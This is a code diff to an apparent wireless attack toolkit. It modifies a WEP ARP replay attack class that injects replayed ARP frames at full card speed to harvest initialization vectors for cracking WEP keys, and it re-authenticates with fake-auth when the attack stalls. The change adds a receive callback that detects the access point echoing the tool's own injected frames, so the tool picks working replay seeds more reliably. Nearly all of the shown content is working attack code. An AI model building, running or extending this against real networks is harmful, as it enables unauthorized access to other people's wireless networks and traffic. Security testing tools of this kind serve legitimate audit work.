@@ -9,12 +9,16 @@ frag/chopchop only manufacture an ARP to feed it.
 
 Only ToDS (client→AP) ARPs are usable seeds — the collector enforces that.
 
-Candidate handling (deliberately PATIENT): the relayed IV from a good ARP can
-arrive a beat after a single short burst, so judging a candidate on one cycle
-falsely condemns replayable seeds. Instead each candidate gets a multi-second
-trial; only sustained zero-yield blacklists it. Once one yields, we lock on
-and keep replaying it. If a locked winner stalls (likely we got de-associated)
-we ask fake-auth to re-auth and keep the same seed rather than discarding it.
+Candidate handling (deliberately PATIENT): the AP's rebroadcast of a good ARP
+can arrive a beat after a single short burst, so judging a candidate on one
+cycle falsely condemns replayable seeds. Instead each candidate gets a multi-
+second trial; only a sustained absence of echoes blacklists it. "Replayable"
+means the AP echoed OUR frame back — we match its rebroadcast on FromDS +
+broadcast DA + SA==our MAC, the same correlation frag/chopchop use — NOT that
+the global IV count happened to rise (another client's traffic must never be
+mistaken for a working replay). Once the AP echoes one, we lock on and keep
+replaying it. If a locked winner stalls (likely we got de-associated) we ask
+fake-auth to re-auth and keep the same seed rather than discarding it.
 
 Operating shape (deliberately SIMPLE): fixed 1-second windows. Each window we
 blast ``rate`` packets at the card's full speed, then sleep out the rest of the
@@ -37,6 +41,8 @@ from wifit3.engine.models import AccessPoint
 from wifit3.engine.attacks import treelog
 
 logger = logging.getLogger(__name__)
+
+_BROADCAST = b"\xff" * 6
 
 
 async def _always_associated() -> bool:
@@ -90,6 +96,8 @@ class WepArpReplay:
     # How long to keep testing one candidate before judging it (seconds). The
     # AP's relayed rebroadcast can lag the burst, so don't condemn on one cycle.
     _TRIAL_WINDOW = 2.5
+    # Echoes (AP rebroadcasts of our own replay) needed to call a candidate
+    # replayable. 1 is definitive — only the AP relaying our frame produces one.
     _MIN_TRIAL_GAIN = 1
     # A locked winner that yields nothing for this long is probably a stale
     # association → ask fake-auth to re-auth (keep the seed) before giving up.
@@ -139,6 +147,12 @@ class WepArpReplay:
         self._last_ivs_s = 0.0                # this window's RAW IVs/s
         self._ivs_ewma = -1.0                 # smoothed IVs/s (what P&O acts on)
 
+        # AP-echo correlation: _rx_cb bumps this when the AP rebroadcasts one of
+        # OUR replays (FromDS + broadcast DA + SA==source_mac). The verdict keys
+        # on echoes gained per trial — NOT the global IV count, which any other
+        # client's traffic inflates. _burst_window snapshots + diffs it.
+        self._echoes = 0
+
         # Candidate under test/replay + its trial accounting.
         self._current: Optional[bytes] = None
         self._winner: Optional[bytes] = None
@@ -163,6 +177,9 @@ class WepArpReplay:
         self._rate_step = self._PO_STEP_PPS
         self._po_prev_ivs_s = -1.0
         self._ivs_ewma = -1.0
+        self._echoes = 0
+        # Watch for the AP echoing our replays back — the "replayable" signal.
+        self.iface.register_rx_callback(self._rx_cb)
         self._task = asyncio.create_task(self._replay_loop())
         logger.info("[WEP-ARP] Replay started on %s", self.bssid)
 
@@ -170,6 +187,7 @@ class WepArpReplay:
         if not self._active:
             return self.stats
         self._active = False
+        self.iface.unregister_rx_callback(self._rx_cb)
         if self._task:
             self._task.cancel()
             self._task = None
@@ -302,10 +320,41 @@ class WepArpReplay:
         )
         return new_hdr + body
 
+    # ---- Echo oracle (RX callback) ------------------------------------------
+
+    def _rx_cb(self, frame: bytes, rssi: int, ts: float) -> None:
+        """Count the AP echoing one of OUR replays — the "replayable" signal.
+
+        Pinned signature (the same correlation frag/chopchop use): Data +
+        FromDS + Protected, Addr1(DA)=broadcast, Addr3(SA)==our source_mac.
+        Our own injections are ToDS (FromDS=0) so they're excluded, and a
+        relayed client ARP carries the client's MAC as SA, not ours — so no
+        other station's traffic can be mistaken for our replay working. Gated on
+        active-and-not-paused: frag/chopchop share our source_mac, so a frag
+        relay (broadcast DA too) during a pause would otherwise bleed in. Runs
+        on every RX frame — keep it cheap.
+        """
+        if not self._active or self._paused or len(frame) < 22:
+            return
+        fc0, fc1 = frame[0], frame[1]
+        if ((fc0 >> 2) & 0x03) != 2:            # not data
+            return
+        if not (fc1 & 0x40):                    # not Protected (WEP)
+            return
+        if not (fc1 & 0x02) or (fc1 & 0x01):    # need FromDS, not ToDS
+            return
+        if frame[4:10] != _BROADCAST:           # Addr1 (DA) not broadcast
+            return
+        if frame[16:22] != self.source_mac:     # Addr3 (SA) not us
+            return
+        self._echoes += 1
+
     async def _burst_window(self, cand: bytes) -> int:
         """One 1-second window: blast ``rate`` packets at the card's full speed,
         then sleep out the rest of the second while the AP's rebroadcasts land.
-        Returns IVs gained this window (≈ IVs/s, the P&O objective)."""
+        Returns the echoes we matched as OURS this window (the verdict signal);
+        the P&O objective — global IVs/s — is tracked separately in _ivs_ewma
+        from the collector's IV count."""
         frame = self._build_replay_frame(cand)
         if frame is None:
             # Malformed capture — blacklist and move on.
@@ -313,6 +362,7 @@ class WepArpReplay:
             self._current = None
             return 0
         ivs_before = self.collector.unique_count(self.bssid)
+        echoes_before = self._echoes
         t0 = time.time()
         sent = 0
         for _ in range(int(round(self._rate))):
@@ -347,7 +397,10 @@ class WepArpReplay:
             raw_ivs_s if self._ivs_ewma < 0
             else a * raw_ivs_s + (1.0 - a) * self._ivs_ewma
         )
-        return gain
+        # The verdict keys on echoes (the AP rebroadcasting OUR frame), not the
+        # IV delta — that's what keeps another client's IVs from false-promoting
+        # a dud candidate. P&O still optimizes global IVs/s via _ivs_ewma above.
+        return self._echoes - echoes_before
 
     def _judge(self, gain: int) -> None:
         """Decide what to do with the current candidate based on its trial."""
@@ -375,7 +428,8 @@ class WepArpReplay:
                 self.stats.has_winner = False
             return
 
-        # Testing a candidate: judge only after a full trial window.
+        # Testing a candidate: it's replayable once the AP has echoed it at least
+        # _MIN_TRIAL_GAIN times; otherwise blacklist after the trial window.
         self._set_state("testing")
         if self._trial_gain >= self._MIN_TRIAL_GAIN:
             self._winner = self._current
@@ -396,7 +450,7 @@ class WepArpReplay:
             self._current = None
             self._log(treelog.leaf_fail(
                 f"[yellow]failed to replay ({failed_len} B)[/yellow] "
-                "[dim](weak signal or hardened AP)[/dim]"
+                "[dim](AP never echoed it)[/dim]"
             ))
 
     def _maybe_adjust_rate(self) -> None:
